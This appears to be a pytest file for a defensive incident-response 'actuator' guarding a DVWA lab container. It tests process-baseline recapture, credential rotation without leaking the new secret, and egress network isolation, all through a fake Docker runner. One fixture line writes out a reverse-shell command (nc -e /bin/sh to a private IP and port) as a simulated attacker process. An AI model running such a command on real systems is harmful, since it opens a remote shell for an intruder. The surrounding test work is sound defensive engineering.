"""Unit tests for the three retargeted actuator controls (no real Docker):

  Fix 1  kill_process baseline auto-recapture on a fresh, clean target reboot
  Fix 2  rotate_secret target-awareness (SQLite fork resets the accounts row;
         DVWA/MySQL path still works; the new secret never leaks)
  Fix 3  isolate_egress / reconnect_egress with a second (egress) network

Each test swaps actuator._RUNNER for a small fake that dispatches on the argv.
"""
import re
from datetime import datetime, timedelta, timezone

import pytest

import actuator


def _iso(dt):
    # Mimic docker's RFC3339 nanosecond + Z form, e.g. 2026-10-24T18:03:11.123456789Z
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%f") + "000Z"


def _stat(pid, start):
    # /proc/<pid>/stat: comm then 16 zero fields, then "1 0 <starttime>" (field 22).
    return f"{pid} (comm) S " + "0 " * 16 + f"1 0 {start}\n"


CLEAN_PROCS = [(1, "apache2 -DFOREGROUND"), (7, "/usr/sbin/apache2 -DFOREGROUND"),
               (8, "/usr/sbin/apache2 -DFOREGROUND")]


@pytest.fixture(autouse=True)
def _reset_baseline(monkeypatch):
    monkeypatch.setattr(actuator, "_BASELINE", {})
    # keep the audit from touching the real data dir
    monkeypatch.setattr(actuator, "_audit", lambda *a, **k: None)
    yield


def install(monkeypatch, *, cid="newcid", started=None, procs=None, proxy_nets="",
            dvwa_nets="", find_config="", php_out="OK", php_rc=0, php_err="",
            egress_name="", leak_secret=False):
    """Install a fake docker runner. Returns a dict capturing what the fake saw."""
    seen = {"php_script": None}
    started = started if started is not None else _iso(datetime.now(timezone.utc))
    procs = CLEAN_PROCS if procs is None else procs

    def runner(args):
        a = " ".join(str(x) for x in args)
        if args[0] == "ps" and "-q" in args:
            if "service=dvwa" in a:
                return (0, cid + "\n", "")
            if "service=proxy" in a:
                return (0, "proxycid\n", "")
            return (0, "", "")
        if args[0] == "inspect" and "StartedAt" in a:
            return (0, started + "\n", "")
        if args[0] == "inspect":  # _nets: {{range .NetworkSettings.Networks}}
            which = dvwa_nets if cid in args else (proxy_nets if "proxycid" in args else "")
            return (0, which + "\n", "")
        if args[0] == "network" and "ls" in args:
            return (0, (egress_name + "\n") if egress_name else "", "")
        if args[0] in ("network",):  # connect / disconnect
            return (0, "", "")
        if args[0] == "exec" and "ps" in args:
            return (0, "".join(_stat_line(p, c) for p, c in procs), "")
        if args[0] == "exec" and "cat" in a and "/proc/" in a:
            pid = next((x for x in args if str(x).startswith("/proc/")), "/proc/0/stat")
            pid = pid.split("/")[2]
            return (0, _stat(int(pid), int(pid) * 1000), "")
        if args[0] == "exec" and "find" in a:
            return (0, find_config + "\n" if find_config else "\n", "")
        if args[0] == "exec" and "instance.php" in a and "-f" in a:
            return (0, "yes\n", "")  # SQLite fork detection
        if args[0] == "exec" and "php" in args and "-r" in args:
            seen["php_script"] = args[-1]
            if leak_secret:
                m = re.search(r"\$new='([0-9a-f]{32})'", args[-1])
                return (php_rc, php_out, f"ERROR near {m.group(1)}" if m else php_err)
            return (php_rc, php_out, php_err)
        if args[0] == "exec" and "cat" in a:  # MySQL config.inc.php read
            return (0, "$_DVWA[ 'db_user' ] = 'app';\n"
                       "$_DVWA[ 'db_password' ] = 'oldpw';\n", "")
        if args[0] == "exec" and "mysql" in a:
            return (1, "", "Access denied") if "--password=oldpw" in args else (0, "1\n", "")
        if args[0] == "exec" and ("sh" in args and "kill" in a):
            return (0, "", "")  # the safe-kill guard
        return (0, "", "")

    def _stat_line(p, c):
        return f"{p} {c}\n"

    monkeypatch.setattr(actuator, "_RUNNER", runner)
    return seen


# ---- Fix 1: baseline auto-recapture ----------------------------------------

def test_fresh_clean_recaptures(monkeypatch):
    install(monkeypatch, cid="newcid", procs=CLEAN_PROCS)
    actuator._BASELINE["dvwa"] = frozenset([("oldcid", 1, "111")])  # stale (old container)
    actuator.ensure_baseline("dvwa")
    base = actuator._BASELINE["dvwa"]
    assert base and all(i[0] == "newcid" for i in base), base


def test_dirty_boot_does_not_recapture(monkeypatch):
    # An attacker process is present -> NOT provably clean -> baseline stays stale.
    dirty = CLEAN_PROCS + [(1234, "nc -e /bin/sh 10.0.0.1 4444")]
    install(monkeypatch, cid="newcid", procs=dirty)
    stale = frozenset([("oldcid", 1, "111")])
    actuator._BASELINE["dvwa"] = stale
    actuator.ensure_baseline("dvwa")
    assert actuator._BASELINE["dvwa"] == stale  # unchanged


def test_old_container_does_not_recapture(monkeypatch):
    # Clean process set but the container started long ago -> not a fresh boot.
    old = _iso(datetime.now(timezone.utc) - timedelta(seconds=actuator.FRESH_SECS + 60))
    install(monkeypatch, cid="newcid", started=old, procs=CLEAN_PROCS)
    stale = frozenset([("oldcid", 1, "111")])
    actuator._BASELINE["dvwa"] = stale
    actuator.ensure_baseline("dvwa")
    assert actuator._BASELINE["dvwa"] == stale


def test_kill_rejected_when_stale_and_dirty(monkeypatch):
    dirty = CLEAN_PROCS + [(1234, "python -c evil")]
    install(monkeypatch, cid="newcid", procs=dirty)
    actuator._BASELINE["dvwa"] = frozenset([("oldcid", 1, "111")])
    out = actuator.run_tool("kill_process",
                            {"target": "dvwa", "pid": 1234, "start_time": "1234000"})
    assert out.startswith("REJECTED") and "stale baseline" in out, out


def test_kill_succeeds_after_recapture(monkeypatch):
    # Clean boot: heartbeat-style recapture establishes the baseline for newcid...
    install(monkeypatch, cid="newcid", procs=CLEAN_PROCS)
    actuator._BASELINE["dvwa"] = frozenset([("oldcid", 1, "111")])  # stale
    actuator.ensure_baseline("dvwa")
    assert all(i[0] == "newcid" for i in actuator._BASELINE["dvwa"])
    # ...then an attacker process (pid 1234) appears and gets killed (it is not baseline).
    install(monkeypatch, cid="newcid", procs=CLEAN_PROCS + [(1234, "sleep 600")])
    out = actuator.run_tool("kill_process",
                            {"target": "dvwa", "pid": 1234, "start_time": "1234000"})
    assert out.startswith("killed"), out


def test_kill_still_rejects_baseline_process(monkeypatch):
    # A protected/service process is never killable, even with a valid baseline.
    install(monkeypatch, cid="newcid", procs=CLEAN_PROCS)
    actuator.ensure_baseline("dvwa")
    out = actuator.run_tool("kill_process",
                            {"target": "dvwa", "pid": 7, "start_time": "7000"})
    assert out.startswith("REJECTED"), out


# ---- Fix 2: rotate_secret target-awareness ---------------------------------

def test_rotate_sqlite_success_and_no_leak(monkeypatch):
    seen = install(monkeypatch, find_config="", php_out="OK")
    out = actuator.run_tool("rotate_secret", {"target": "dvwa"})
    assert out.startswith("reset compromised operator credentials"), out
    assert "not logged" in out.lower()
    assert not re.search(r"[0-9a-f]{32}", out), "secret leaked into result"
    # the real rotation happened via PHP against the accounts table
    assert "UPDATE" in seen["php_script"] and "md5($new)" in seen["php_script"]


def test_rotate_sqlite_verification_fail(monkeypatch):
    install(monkeypatch, find_config="", php_out="FAIL")
    out = actuator.run_tool("rotate_secret", {"target": "dvwa"})
    assert out.startswith("REJECTED") and "verification failed" in out, out


def test_rotate_sqlite_redacts_secret_on_error(monkeypatch):
    install(monkeypatch, find_config="", php_rc=1, leak_secret=True)
    out = actuator.run_tool("rotate_secret", {"target": "dvwa"})
    assert out.startswith("REJECTED")
    assert not re.search(r"[0-9a-f]{32}", out), f"secret leaked in error: {out}"


def test_rotate_mysql_branch_still_works(monkeypatch):
    install(monkeypatch, find_config="/var/www/html/config/config.inc.php")
    out = actuator.run_tool("rotate_secret", {"target": "dvwa"})
    assert out.startswith("rotated DB password"), out
    assert "oldpw" not in out and "not logged" in out.lower()


# ---- Fix 3: isolate_egress / reconnect_egress ------------------------------

def test_isolate_drops_only_egress(monkeypatch):
    install(monkeypatch, cid="newcid",
            dvwa_nets="bastion_edge bastion_egress",
            proxy_nets="bastion_default bastion_edge")
    out = actuator.run_tool("isolate_egress", {"target": "dvwa"})
    assert out.startswith("egress isolated")
    assert "bastion_egress" in out and "bastion_edge" not in out, out


def test_isolate_single_net_reports_no_egress(monkeypatch):
    # Old single-network topology: app shares its only net with the proxy -> nothing to cut.
    install(monkeypatch, cid="newcid",
            dvwa_nets="bastion_default", proxy_nets="bastion_default")
    out = actuator.run_tool("isolate_egress", {"target": "dvwa"})
    assert "no separate egress network" in out


def test_reconnect_egress(monkeypatch):
    install(monkeypatch, cid="newcid", dvwa_nets="bastion_edge",
            egress_name="bastion_egress")
    out = actuator.run_tool("reconnect_egress", {"target": "dvwa"})
    assert out.startswith("egress restored") and "bastion_egress" in out, out


def test_reconnect_egress_no_network(monkeypatch):
    install(monkeypatch, cid="newcid", dvwa_nets="bastion_edge", egress_name="")
    out = actuator.run_tool("reconnect_egress", {"target": "dvwa"})
    assert out.startswith("REJECTED") and "no egress network" in out
